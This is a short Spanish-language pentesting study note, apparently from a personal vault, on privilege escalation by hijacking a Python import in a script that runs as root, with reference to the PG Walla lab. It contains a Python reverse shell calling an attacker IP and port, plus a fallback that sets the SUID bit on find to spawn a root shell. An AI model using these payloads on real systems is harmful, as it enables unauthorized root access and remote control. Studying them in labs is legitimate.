
## DESCRIPTION

Si encontramos un script en python que se puede ejecutar como root y que da error en una librería en un import, podemos intentar sustituirla (creándola en el directorio donde esta el script de primeras si no ver las envs)

![[Pasted image 20230704204419.png]]

![[Pasted image 20230704204546.png]]

#### Mas información
* https://grumpygeekwrites.wordpress.com/2021/09/18/offensive-security-pg-practice-walla-walk-through-tutorial-writeup/


## EXPLOITATION

1. Podemos poner una reverse shell:

```
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.3",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()

```


**!!NOTA IMPORTANTE!!** 

Si falla podemos probar a ejecutar comando del sistema, por ejemplo darle el bit s a find

```
import os

os.system("chmod +s /usr/bin/find");
```

![[Pasted image 20230704204738.png]]

De esta forma cuando lo ejecutemos con sudo se establecera este permiso que posteriormente ejecutando: `/usr/bin/find . -exec /bin/sh -p \; -quit` tendremos la shell como root
## MACHINES

* Hack The Box: 
* PG: Walla

**!!NOTA IMPORTANTE!!** 